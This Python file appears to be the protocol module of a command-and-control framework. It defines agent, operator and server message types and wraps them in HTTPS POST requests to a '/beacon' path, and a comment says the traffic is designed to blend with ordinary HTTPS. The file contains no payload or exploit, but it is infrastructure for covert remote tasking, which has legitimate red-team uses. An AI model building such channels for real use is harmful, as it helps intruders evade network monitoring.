import struct

MSG_ERROR                = 0xFFFFFFFF

MSG_AGENT_GET_TASK       = 0x10000001
MSG_AGENT_POST_RESULT    = 0x10000002
MSG_OPERATOR_SUBMIT_TASK = 0x10000003
MSG_OPERATOR_GET_RESULT  = 0x10000004
MSG_SERVER_NO_TASK       = 0x10000005
MSG_SERVER_TASK          = 0x10000006
MSG_SERVER_ACK           = 0x10000007
MSG_SERVER_RESULT        = 0x10000008
MSG_SERVER_PENDING       = 0x10000009
MSG_OPERATOR_LIST_PENDING  = 0x1000000A
MSG_SERVER_TASK_LIST       = 0x1000000B
MSG_OPERATOR_LIST_HISTORY  = 0x1000000C
MSG_SERVER_TASK_HISTORY    = 0x1000000D

DEFAULT_AGENT_ID = 1

TASK_STATE_QUEUED_CODE    = 1
TASK_STATE_LEASED_CODE    = 2
TASK_STATE_COMPLETED_CODE = 3

MESSAGE_NAMES = {
    MSG_ERROR:                "MSG_ERROR",
    MSG_AGENT_GET_TASK:       "MSG_AGENT_GET_TASK",
    MSG_AGENT_POST_RESULT:    "MSG_AGENT_POST_RESULT",
    MSG_OPERATOR_SUBMIT_TASK: "MSG_OPERATOR_SUBMIT_TASK",
    MSG_OPERATOR_GET_RESULT:  "MSG_OPERATOR_GET_RESULT",
    MSG_SERVER_NO_TASK:       "MSG_SERVER_NO_TASK",
    MSG_SERVER_TASK:          "MSG_SERVER_TASK",
    MSG_SERVER_ACK:           "MSG_SERVER_ACK",
    MSG_SERVER_RESULT:        "MSG_SERVER_RESULT",
    MSG_SERVER_PENDING:       "MSG_SERVER_PENDING",
    MSG_OPERATOR_LIST_PENDING:  "MSG_OPERATOR_LIST_PENDING",
    MSG_SERVER_TASK_LIST:       "MSG_SERVER_TASK_LIST",
    MSG_OPERATOR_LIST_HISTORY:  "MSG_OPERATOR_LIST_HISTORY",
    MSG_SERVER_TASK_HISTORY:    "MSG_SERVER_TASK_HISTORY",
}

# ---------------------------------------------------------------------------
# Raw TLV primitives (used internally by the HTTP helpers below)
# ---------------------------------------------------------------------------

def _recv_exact(sock, length):
    """Read exactly length bytes from sock, blocking until available."""
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def encode_tlv(message_type, payload=b""):
    """Encode a TLV message to bytes."""
    return struct.pack("<II", message_type, len(payload)) + payload


def _decode_tlv_bytes(data):
    """Decode a TLV message from a bytes object.  Returns (type, payload) or None."""
    if len(data) < 8:
        return None
    msg_type, length = struct.unpack("<II", data[:8])
    if len(data) < 8 + length:
        return None
    return msg_type, data[8:8 + length]


# ---------------------------------------------------------------------------
# HTTP-over-TLS framing helpers
# ---------------------------------------------------------------------------
# The transport is plain HTTPS: each message is a TLV payload carried in the
# body of an HTTP/1.1 request or response.  This makes C2 traffic blend with
# ordinary application HTTPS at the network layer.

_MAX_HEADER_BYTES = 65536   # sanity cap on incoming HTTP headers


def recv_http_tlv(sock):
    """
    Read one HTTP request from sock and return the TLV body as (type, payload).

    Reads until the blank line that terminates the HTTP headers, extracts
    Content-Length, reads exactly that many body bytes, then decodes the TLV.

    Returns None on any read or parse error.
    """
    buf = b""
    while b"\r\n\r\n" not in buf:
        try:
            chunk = sock.recv(4096)
        except OSError:
            return None
        if not chunk:
            return None
        buf += chunk
        if len(buf) > _MAX_HEADER_BYTES:
            return None

    sep          = buf.index(b"\r\n\r\n") + 4
    headers_raw  = buf[:sep - 4]
    body         = buf[sep:]

    content_length = 0
    for line in headers_raw.split(b"\r\n")[1:]:   # skip request/status line
        if line.lower().startswith(b"content-length:"):
            try:
                content_length = int(line.split(b":", 1)[1].strip())
            except ValueError:
                return None
            break

    if content_length == 0:
        return None

    # Read any remaining body bytes not captured with the headers.
    while len(body) < content_length:
        try:
            chunk = sock.recv(content_length - len(body))
        except OSError:
            return None
        if not chunk:
            return None
        body += chunk

    return _decode_tlv_bytes(body)


def send_http_response(sock, msg_type, payload=b""):
    """
    Send a TLV message wrapped in an HTTP/1.1 200 response.

    The TLV bytes become the response body; Content-Length is set
    accordingly so the client knows exactly how many bytes to read.
    """
    body = encode_tlv(msg_type, payload)
    header = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    sock.sendall(header + body)


def send_http_request(sock, host, msg_type, payload=b""):
    """
    Send a TLV message wrapped in an HTTP/1.1 POST request.

    Used by the operator client to submit messages to the C2 server.
    """
    body = encode_tlv(msg_type, payload)
    header = (
        "POST /beacon HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    sock.sendall(header + body)


def recv_http_response_tlv(sock):
    """
    Read one HTTP response from sock and return the TLV body as (type, payload).

    Mirrors recv_http_tlv but tolerates an HTTP status line instead of a
    request line (both are skipped; only Content-Length matters).
    """
    return recv_http_tlv(sock)
